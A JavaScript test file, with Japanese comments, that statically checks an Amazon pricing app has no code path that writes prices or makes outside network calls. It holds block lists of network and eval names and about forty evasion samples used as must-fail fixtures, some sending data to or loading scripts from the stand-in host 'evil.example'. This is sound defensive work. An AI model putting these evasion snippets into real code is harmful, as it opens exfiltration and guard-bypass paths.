/**
 * test-no-write-path.mjs — 「Amazon へ書き込む経路が無い」ことを機械的に確かめる。
 *
 * ★このアプリの安全は kill switch ではなく「書き込むコードが存在しない」ことで担保している。
 *   env を入れても、API を直叩きしても、価格は変わらない。
 *   将来、実行段階 (M3) を足すときは、このテストを**意図して**書き換えることになる (= レビューで必ず目に入る)。
 *
 * 検査の方針 (Codex R1/R2 の指摘を受けて): 部分文字列の一致ではなく、
 *   1. コメントを取り除き、空白を正規化したソースに対して
 *   2. **危険な名前そのもの** (fetch / eval / Function / globalThis / window / self / Reflect / process / require …) を
 *      語として禁止する — 呼び方 (別名・optional call・コメント挿入・空白) をどう変えても名前が残る
 *   3. 動的な名前の組み立て (計算プロパティに引用符や + や ${})・optional call・.call/.apply/.bind を禁止
 *   4. 静的 import は許可リストだけ。**アプリから到達できる相対 import を再帰的にたどり、外部モジュールも同じ検査**
 *   5. 画面 (.ejs) は <script> と on*= 属性を取り出して同様に検査。HTML の外部読み込み (script src / iframe / form action …) も禁止。
 *      自分の API への fetch だけ許し、URL は文字列リテラルの連結だけ (.. や // を含まない) を許す
 *   6. 回避コードの見本 (Codex が挙げたものを含む 30 種) を検査に掛けて**必ず落ちる**ことを確かめる
 *
 * 限界 (明記): 構文木ではなく正規化した文字列に対する検査。実行環境の外向き通信を遮断するものではなく、
 * DB や env を書き換えられる権限を持つ人は対象外。通常のコードレビューを置き換えるものでもない。
 *
 * 実行: node apps/amazon-pricing/test-no-write-path.mjs
 */
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(HERE, '../..');
let failed = 0;
const ok = (cond, label) => { console.log(`${cond ? '✅' : '❌'} ${label}`); if (!cond) failed++; };

// 単語を分けて書いてあるのは、このテスト自身が検査対象になったときに引っかからないようにするため
const j = (...parts) => parts.join('');

/** サーバ側 JS で「語」として禁止する名前 */
const BANNED_WORDS_JS = [
  // 通信・動的実行・グローバル経由の到達
  'fetch', 'eval', 'Function', 'globalThis', 'window', 'self', 'Reflect', 'process', 'require', 'WebSocket', 'XMLHttpRequest',
  'EventSource', 'Worker', 'WebAssembly', 'getBuiltinModule', 'dlopen', 'binding',
  'request', 'http', 'https', 'net', 'tls', 'dns', 'child_process', 'vm', 'worker_threads', 'undici', 'axios', 'importScripts',
  // SP-API / miniPC の書き込み口
  j('update', 'Price'), j('patch', 'ListingsItem'), j('patch', 'Listing'), j('put', 'ListingsItem'), j('create', 'Feed'), j('call', 'MiniPC'),
  j('WAREHOUSE', '_URL'), j('Selling', 'Partner'), j('purchasable', '_offer'), j('SP_API', '_CLIENT_ID'), j('SP_API', '_REFRESH_TOKEN'),
];
/** サーバ側 JS で禁止する文字列 (語境界を持たないもの) */
const BANNED_FRAGMENTS_JS = [
  j('import', '('), j('?.', '('), j('?.', '['), '.call(', '.apply(', '.bind(', j('service-api', '/'), j('amazon-', 'sp-api'), j('sp-api', '.js'),
  j('research-', 'service'), j('client-', 'sqs'), 'node:', 'data:', 'file:',
];
/** 画面 (ブラウザ側 JS) で「語」として禁止する名前 */
const BANNED_WORDS_VIEW = [
  'eval', 'Function', 'XMLHttpRequest', 'WebSocket', 'sendBeacon', 'EventSource', 'import', 'window', 'self', 'globalThis', 'top',
  'parent', 'frames', 'opener', 'Worker', 'Reflect', 'http', 'https', 'open', 'postMessage', 'importScripts', 'srcdoc',
];
const BANNED_FRAGMENTS_VIEW = [j('?.', '('), j('?.', '['), '.call(', '.apply(', '.bind(', 'createElement(', '.src', '.action', '//', 'javascript:', 'data:'];
/** 静的 import の許可リスト (相対パスは別扱い) */
const ALLOWED_BARE_IMPORTS = new Set(['express', 'path', 'fs', 'url', 'os', 'node:fs', 'node:path', 'node:url', 'node:os', 'better-sqlite3']);
/** アプリのモジュール (./ で参照してよいもの)。test-* はここに無いので、本番ファイルからは import できない */
const APP_MODULES = new Set(['./engine.js', './db.js', './read-model.js', './evaluate.js', './router.js']);
/** アプリの外で到達してよいモジュール (相対パスで、アプリのファイルから見た形) */
const ALLOWED_EXTERNAL = new Set(['../warehouse-mirror/db.js', '../price-update/format.js']);
/** 計算プロパティの直前にあってよい語 (配列リテラルの直前に来るキーワード) */
const ARRAY_LITERAL_KEYWORDS = new Set(['of', 'in', 'return', 'typeof', 'await', 'yield', 'case', 'throw', 'delete', 'void', 'new', 'else', 'do', 'instanceof']);

/** 文字列・テンプレート・正規表現を壊さずにコメントだけ取り除く */
export function stripComments(src) {
  let out = '';
  let i = 0;
  const n = src.length;
  let quote = null; // ' " ` のどれかの中
  while (i < n) {
    const c = src[i];
    const next = src[i + 1];
    if (quote) {
      out += c;
      if (c === '\\') { out += next ?? ''; i += 2; continue; }
      if (c === quote) quote = null;
      i += 1;
      continue;
    }
    if (c === "'" || c === '"' || c === '`') { quote = c; out += c; i += 1; continue; }
    if (c === '/' && next === '/') { while (i < n && src[i] !== '\n') i += 1; continue; }
    if (c === '/' && next === '*') { const end = src.indexOf('*/', i + 2); i = end < 0 ? n : end + 2; out += ' '; continue; }
    out += c;
    i += 1;
  }
  return out;
}

/** 空白を正規化: 連続空白は 1 つに、( と . の前後の空白は取る (fetch /* gap *\/ (x) → fetch(x)) */
export function normalize(src) {
  return stripComments(src).replace(/\s+/g, ' ').replace(/\s*([(.])\s*/g, '$1').replace(/\?\s*\.\s*/g, '?.');
}

/** 計算プロパティ (obj[...]) の中に引用符・バッククォート・${・+ があれば「名前を組み立てている」 */
function findComputedConcat(code) {
  const hits = [];
  const re = /\[([^\]\n]*)\]/g;
  let m;
  while ((m = re.exec(code))) {
    const inner = m[1];
    if (!/['"`+]|\$\{/.test(inner)) continue;
    // 単純な文字列リテラル 1 つ (headers['content-type']) は「組み立て」ではない。
    // その中に危険な名前があれば語の禁止 (文字列の中も見る) が別に拾う (obj['fetch'] は fetch で落ちる)
    if (/^\s*(['"])[^'"`$+]*\1\s*$/.test(inner)) continue;
    // 直前のトークン (空白を飛ばす) を見る。) ] か識別子 (配列リテラルの前に来るキーワード以外) なら計算プロパティ
    let k = m.index - 1;
    while (k >= 0 && /\s/.test(code[k])) k -= 1;
    if (k < 0) continue;
    const ch = code[k];
    if (ch === ')' || ch === ']') { hits.push(m[0]); continue; }
    if (/[\w$]/.test(ch)) {
      let s = k;
      while (s >= 0 && /[\w$]/.test(code[s])) s -= 1;
      const word = code.slice(s + 1, k + 1);
      if (!ARRAY_LITERAL_KEYWORDS.has(word)) hits.push(`${word}${m[0]}`);
    }
  }
  return hits;
}

/** fetch('/apps/amazon-pricing/api/...' + encodeURIComponent(x) + '/review', ...) の第 1 引数だけを許す */
function checkViewFetch(code) {
  const problems = [];
  const re = /\bfetch\(/g;
  let m;
  while ((m = re.exec(code))) {
    let depth = 0;
    let k = m.index + m[0].length;
    let arg = '';
    for (; k < code.length; k += 1) {
      const c = code[k];
      if (c === '(') depth += 1;
      if (c === ')') { if (depth === 0) break; depth -= 1; }
      if (c === ',' && depth === 0) break;
      arg += c;
    }
    const tokens = arg.split('+').map((t) => t.trim());
    const first = tokens[0];
    const lit = /^'([^'\\]*)'$/.exec(first);
    if (!lit || !lit[1].startsWith('/apps/amazon-pricing/api/')) { problems.push(`自分の API 以外への fetch: ${arg.slice(0, 60)}`); continue; }
    for (const t of tokens) {
      const l = /^'([^'\\]*)'$/.exec(t);
      if (l) { if (/\.\.|\/\/|:|\\/.test(l[1])) problems.push(`fetch の URL に危険な断片: ${t}`); continue; }
      if (/^encodeURIComponent\([\w$.]+\)$/.test(t)) continue;
      problems.push(`fetch の URL に許可外の式: ${t}`);
    }
  }
  return problems;
}

/**
 * 1 ファイルぶんの検査。問題の一覧を返す (空なら OK)
 * @param {string} src
 * @param {{isView?:boolean, checkImports?:boolean}} opts
 */
export function scanSource(src, { isView = false, checkImports = true, external = false } = {}) {
  const problems = [];
  // 外部モジュール (warehouse-mirror/db.js 等) は URL の文字列や "request" という語を持つが、それ自体は通信ではない。
  // 通信の実体 (fetch / require / import( / node: / net / tls …) の禁止はそのまま効く
  const bannedWords = external ? BANNED_WORDS_JS.filter((w) => !['http', 'https', 'request'].includes(w)) : BANNED_WORDS_JS;
  if (isView) {
    // HTML 側: 外部読み込み・送信先を持つ要素
    const html = stripComments(src.replace(/<%[^]*?%>/g, ' EJS ')); // EJS タグの中身は JS として別に見ない (テンプレ側のヘルパー呼び出し)
    for (const [re, label] of [
      [/<script[^>]*\ssrc=/i, 'script src'], [/<script[^>]*type=["']module/i, 'script type=module'], [/<iframe/i, 'iframe'], [/<object/i, 'object'],
      [/<embed/i, 'embed'], [/<link/i, 'link'], [/<base/i, 'base'], [/<meta[^>]*http-equiv/i, 'meta http-equiv'], [/\bformaction=/i, 'formaction'],
      [/\bsrcdoc=/i, 'srcdoc'], [/javascript:/i, 'javascript: URL'], [/<img/i, 'img (外部画像は読み込ませない)'],
    ]) if (re.test(html)) problems.push(`HTML に ${label}`);
    for (const m of html.matchAll(/\baction=["']([^"']*)["']/g)) {
      if (!m[1].startsWith('/apps/amazon-pricing/')) problems.push(`form action が自分のパス以外: ${m[1]}`);
    }
    for (const m of src.matchAll(/\bhref=["']([^"']*)["']/g)) {
      const v = m[1];
      if (!(v.startsWith('/') || v.startsWith('?') || v.startsWith('#') || v.startsWith('https://www.amazon.co.jp/dp/') || v.startsWith('<%= qs(') || v.startsWith('<%= new URLSearchParams'))) {
        problems.push(`href が許可外: ${v.slice(0, 60)}`);
      }
    }
    // JS 側: <script> の中身と on*= 属性
    const scripts = [...src.matchAll(/<script\b[^>]*>([^]*?)<\/script>/gi)].map((m) => m[1]);
    const handlers = [...src.matchAll(/\son\w+=["']([^"']*)["']/gi)].map((m) => m[1]);
    if (handlers.length) problems.push(`インライン イベントハンドラ (on*=) は使わない: ${handlers[0].slice(0, 40)}`);
    for (const s of scripts) {
      const code = normalize(s);
      for (const w of BANNED_WORDS_VIEW) if (new RegExp(`(?<![\\w$])${w}(?![\\w$])`).test(code)) problems.push(`禁止語 "${w}"`);
      for (const f of BANNED_FRAGMENTS_VIEW) if (code.includes(f)) problems.push(`禁止 "${f}"`);
      for (const h of findComputedConcat(code)) problems.push(`計算プロパティで名前を組み立てている: ${h.slice(0, 40)}`);
      problems.push(...checkViewFetch(code));
    }
    return problems;
  }
  let code = normalize(src);
  // process.env.X の読み取りと process.cwd() だけは許す (設定の読み取り。ネットワークではない)
  code = code.replace(/\bprocess\.env\.[\w$]+/g, 'ENV_READ').replace(/\bprocess\.cwd\(\)/g, 'CWD_READ');
  for (const w of bannedWords) if (new RegExp(`(?<![\\w$])${w}(?![\\w$])`).test(code)) problems.push(`禁止語 "${w}"`);
  for (const f of BANNED_FRAGMENTS_JS) if (code.includes(f)) problems.push(`禁止 "${f}"`);
  for (const h of findComputedConcat(code)) problems.push(`計算プロパティで名前を組み立てている: ${h.slice(0, 40)}`);
  if (checkImports) {
    for (const m of code.matchAll(/(?<![\w$])(?:import|export)\b[^;'"]*?\bfrom\s*['"]([^'"]+)['"]/g)) {
      const spec = m[1];
      if (spec.startsWith('./')) { if (!APP_MODULES.has(spec)) problems.push(`アプリ内の許可外 import "${spec}"`); continue; }
      if (spec.startsWith('../')) { if (!ALLOWED_EXTERNAL.has(spec)) problems.push(`許可外の外部 import "${spec}"`); continue; }
      if (!ALLOWED_BARE_IMPORTS.has(spec)) problems.push(`許可外の import "${spec}"`);
    }
    for (const m of code.matchAll(/(?<![\w$])import\s*['"]([^'"]+)['"]/g)) problems.push(`副作用 import "${m[1]}"`);
    if (/(?<![\w$])export\s*\*\s*from/.test(code)) problems.push('export * from (再エクスポート)');
  }
  return problems;
}

/** 到達できる相対 import を再帰的に集める (外部モジュールの依存先も見る) */
function reachableFrom(files) {
  const seen = new Map(); // abs path → { via }
  const queue = files.map((f) => ({ file: f, via: '(entry)' }));
  while (queue.length) {
    const { file, via } = queue.shift();
    if (seen.has(file)) continue;
    seen.set(file, via);
    const src = normalize(fs.readFileSync(file, 'utf8'));
    for (const m of src.matchAll(/(?<![\w$])(?:import|export)\b[^;'"]*?\bfrom\s*['"](\.{1,2}\/[^'"]+)['"]/g)) {
      queue.push({ file: path.resolve(path.dirname(file), m[1]), via: path.relative(ROOT, file).replace(/\\/g, '/') });
    }
  }
  return seen;
}

function walk(dir, out = []) {
  for (const e of fs.readdirSync(dir, { withFileTypes: true })) {
    const p = path.join(dir, e.name);
    if (e.isDirectory()) walk(p, out);
    else if (/\.(js|mjs|cjs|ejs)$/.test(e.name) && !/^test-/.test(e.name)) out.push(p);
  }
  return out;
}
const rel = (f) => path.relative(ROOT, f).replace(/\\/g, '/');

console.log('\n── 1. apps/amazon-pricing/ に書き込み経路・動的実行が無い ──');
const appFiles = walk(HERE);
{
  ok(appFiles.length >= 8, `対象ファイル ${appFiles.length} 本`);
  ok(appFiles.every((f) => !f.endsWith('.cjs')), '.cjs (require が使える形式) が無い');
  for (const f of appFiles) {
    const problems = scanSource(fs.readFileSync(f, 'utf8'), { isView: f.endsWith('.ejs') });
    ok(problems.length === 0, `${rel(f)}: ${problems.length === 0 ? 'OK' : problems.join(' / ')}`);
  }
}

console.log('\n── 2. アプリから到達できるモジュール (外部も含む) を再帰的に検査 ──');
{
  const entries = appFiles.filter((f) => /\.m?js$/.test(f));
  const reached = reachableFrom(entries);
  const outside = [...reached.keys()].filter((f) => !f.startsWith(HERE));
  ok(outside.length >= 2, `外部モジュール ${outside.length} 本に到達: ${outside.map(rel).join(', ')}`);
  for (const f of outside) {
    ok(fs.existsSync(f), `${rel(f)}: 実在する (経由: ${reached.get(f)})`);
    if (!fs.existsSync(f)) continue;
    const src = normalize(fs.readFileSync(f, 'utf8'));
    // 外部モジュールは import 許可リストが違う (自分の相対 import は可)。通信・動的実行の禁止は同じ
    const problems = scanSource(fs.readFileSync(f, 'utf8'), { checkImports: false, external: true });
    for (const m of src.matchAll(/(?<![\w$])(?:import|export)\b[^;'"]*?\bfrom\s*['"]([^'"]+)['"]/g)) {
      const spec = m[1];
      if (!spec.startsWith('.') && !ALLOWED_BARE_IMPORTS.has(spec)) problems.push(`許可外の import "${spec}"`);
    }
    ok(problems.length === 0, `${rel(f)}: ${problems.length === 0 ? 'OK' : problems.join(' / ')}`);
  }
  // アプリの中で到達したファイルは test-* を含まない (本番ファイルからテストを import して検査を逃れる経路)
  const insideReached = [...reached.keys()].filter((f) => f.startsWith(HERE));
  ok(insideReached.every((f) => !/[\\/]test-/.test(f)), 'アプリ内で到達するファイルに test-* が無い');
}

console.log('\n── 3. 旧ツールの書き込み口が消えている ──');
{
  const router = fs.readFileSync(path.join(ROOT, 'apps/profit-calculator/router.js'), 'utf8');
  ok(!router.includes(j("router.post('/api/amazon/", "update-price'")), 'profit-calculator: POST /api/amazon/update-price が無い');
  ok(!router.includes(j("'/api/price-revision/", "worker/start'")), 'profit-calculator: POST /api/price-revision/worker/start が無い');
  ok(!router.includes(j('start', 'PriceWorker')), 'profit-calculator: ワーカー起動の import が無い');
  ok(!router.includes(j("callMiniPC('/", "price'")), 'profit-calculator: miniPC の /price を呼ぶ関数が無い');
  const server = fs.readFileSync(path.join(ROOT, 'server.js'), 'utf8');
  ok(!new RegExp(`^import[^\\n]*${j('price-', 'scheduler')}`, 'm').test(server), 'server.js: price-scheduler を import していない');
  ok(!new RegExp(`^\\s*${j('start', 'PriceWorker')}\\(`, 'm').test(server), 'server.js: ワーカーを起動していない');
  ok(server.includes("requireAppAccess('amazon-pricing')"), 'server.js: 新アプリは画面権限つきでマウント');
}

console.log('\n── 4. 旧ワーカーのファイルが無い ──');
{
  for (const f of ['apps/profit-calculator/price-scheduler.js', 'apps/profit-calculator/price-engine.js']) {
    ok(!fs.existsSync(path.join(ROOT, f)), `${f} が存在しない`);
  }
}

console.log('\n── 5. ★検査自身の検査: 回避コードは必ず落ちる ──');
{
  const EVASIONS = [
    ['Codex R1: dynamic import + 文字列連結', `const m = await ${j('import', '(')}'../profit-calculator/' + 'sp-' + 'api.js'); await m['update' + 'Price']({ sku, price });`],
    ['Codex R2: コメント挿入 import', `await ${j('import', '')} /* gap */ ('node:tls');`],
    ['Codex R2: fetch の別名', `const send = ${j('globalThis', '')}.${j('fet', 'ch')}; send(url);`],
    ['Codex R2: optional call', `${j('globalThis', '')}.${j('fet', 'ch')}?.(url);`],
    ['Codex R2: eval の別名', `const run = ${j('ev', 'al')}; run(source);`],
    ['Codex R2: Function の別名', `const C = ${j('globalThis', '')}.${j('Fun', 'ction')}; C(source)();`],
    ['Codex R2: getBuiltinModule', `${j('proc', 'ess')}.getBuiltinModule(\`https\`).request(options);`],
    ['Codex R2: Reflect', `${j('Refl', 'ect')}['get'](${j('globalThis', '')}, '${j('fet', 'ch')}')(url);`],
    ['Codex R2: globalThis + コメント + 計算プロパティ', `${j('globalThis', '')} /* gap */ ['${j('fet', 'ch')}'](url);`],
    ['Codex R2: fetch とコメント', `${j('fet', 'ch')} /* gap */ (url);`],
    ['Codex R2: eval とコメント', `${j('ev', 'al')} /* gap */ ('x');`],
    ['Codex R2: new Function とコメント', `new /* gap */ ${j('Fun', 'ction')} /* gap */ ('x');`],
    ['計算プロパティ (後置連結)', `const fn = obj[name + 'Price'];`],
    ['計算プロパティ (テンプレート)', `obj[\`upd\${'ate'}Price\`]();`],
    ['計算プロパティ (空白あり)', `obj ['upd' + 'ate']();`],
    ['計算プロパティ (危険な名前のリテラル)', `const g = obj['${j('fet', 'ch')}']; g(url);`],
    ['.call 経由', `helper.call(null, url);`],
    ['createRequire', `const r = ${j('create', 'Require')}(import.meta.url); r('https');`],
    ['node:https の import', `import https from '${j('node:', 'https')}';`],
    ['旧 SP-API モジュールの import', `import { x } from '../profit-calculator/${j('sp-api', '.js')}';`],
    ['許可外の再エクスポート', `export * from '../price-update/live-price.js';`],
    ['副作用 import', `import '../warehouse/research-service.js';`],
    ['テストファイルの import', `import { w } from './test-writer.mjs';`],
    ['fetch を変数に逃がす', `const f = ${j('fet', 'ch')}(url);`],
    ['child_process', `import { spawn } from '${j('child_', 'process')}';`],
    ['data: URL', `const u = 'data:text/javascript,alert(1)';`],
  ];
  for (const [label, code] of EVASIONS) {
    const problems = scanSource(code, { isView: false });
    ok(problems.length > 0, `落ちる: ${label} → ${problems[0] || '(検出できず)'}`);
  }
  const VIEW_EVASIONS = [
    ['外部への fetch', `<script>${j('fet', 'ch')}('https://evil.example/');</script>`],
    ['変数 URL への fetch', `<script>${j('fet', 'ch')}(url);</script>`],
    ['Codex R2: 自分のプレフィックス + ../ で別アプリへ', `<script>${j('fet', 'ch')}('/apps/amazon-pricing/api/../../profit-calculator/api/products/1/list-amazon', { method: 'POST' });</script>`],
    ['Codex R2: window.fetch の別名', `<script>const send = ${j('win', 'dow')}.${j('fet', 'ch')}; send('https://example.invalid/');</script>`],
    ['Codex R2: optional call', `<script>${j('win', 'dow')}.${j('fet', 'ch')}?.('https://example.invalid/');</script>`],
    ['Codex R2: self + テンプレート計算プロパティ', `<script>${j('se', 'lf')}[\`fet\${'ch'}\`]('https://example.invalid/');</script>`],
    ['Codex R2: navigator + テンプレート計算プロパティ', `<script>navigator[\`send\${'Beacon'}\`]('https://example.invalid/', data);</script>`],
    ['sendBeacon', `<script>navigator.${j('send', 'Beacon')}('https://evil.example/', data);</script>`],
    ['XMLHttpRequest', `<script>new ${j('XMLHttp', 'Request')}();</script>`],
    ['dynamic import', `<script>${j('import', '(')}'https://evil.example/m.js');</script>`],
    ['script src', `<${j('script', '')} src="https://evil.example/x.js"></script>`],
    ['form action 外部', `<form action="https://evil.example/collect"><input name="x"></form>`],
    ['iframe', `<${j('ifr', 'ame')} src="https://evil.example/"></iframe>`],
    ['createElement(script)', `<script>var s = document.${j('create', 'Element')}('script'); s.${j('sr', 'c')} = 'https://evil.example/x.js';</script>`],
    ['インライン onclick', `<button ${j('on', 'click')}="${j('fet', 'ch')}('https://evil.example/')">x</button>`],
    ['fetch の URL に変数連結', `<script>${j('fet', 'ch')}('/apps/amazon-pricing/api/' + path);</script>`],
    ['href が外部', `<a href="https://evil.example/">x</a>`],
  ];
  for (const [label, code] of VIEW_EVASIONS) {
    const problems = scanSource(code, { isView: true });
    ok(problems.length > 0, `落ちる (画面): ${label} → ${problems[0] || '(検出できず)'}`);
  }
  // 正しい形は通る
  ok(scanSource(`<script>${j('fet', 'ch')}('/apps/amazon-pricing/api/policies/' + encodeURIComponent(sku), { method: 'POST' });</script>`, { isView: true }).length === 0, '通る (画面): 自分の API への fetch (encodeURIComponent 連結)');
  ok(scanSource(`<script>${j('fet', 'ch')}('/apps/amazon-pricing/api/evaluations/' + encodeURIComponent(id) + '/review', { method: 'POST' });</script>`, { isView: true }).length === 0, '通る (画面): 途中にリテラルを挟む連結');
  ok(scanSource(`import express from 'express';\nimport { getMirrorDB } from '../warehouse-mirror/db.js';\nimport { x } from './engine.js';\nconst a = ['GET', 'HEAD'].includes(m); for (const t of ['x', 'y']) {} return ['a' + b];`).length === 0, '通る: 許可リスト内の import と配列リテラル');
  ok(scanSource(`const D = process.env.DATA_DIR || path.join(process.cwd(), 'data');`).length === 0, '通る: process.env の読み取りと process.cwd()');
  ok(scanSource(`const ct = String(req.headers['content-type'] || '');`).length === 0, '通る: 文字列リテラル 1 つの計算プロパティ');
  ok(scanSource(`const u = 'https://example.com'; const request = 1;`, { external: true }).length === 0, '通る (外部モジュール): URL 文字列と request という語');
  ok(scanSource(`const u = 'https://example.com';`).length > 0, '落ちる (アプリ): URL 文字列');
}

console.log(`\n${failed === 0 ? '🎉 ALL PASS — Amazon へ書き込む経路はありません (静的検査の範囲で)' : `❌ ${failed} 件失敗`}`);
process.exit(failed === 0 ? 0 : 1);
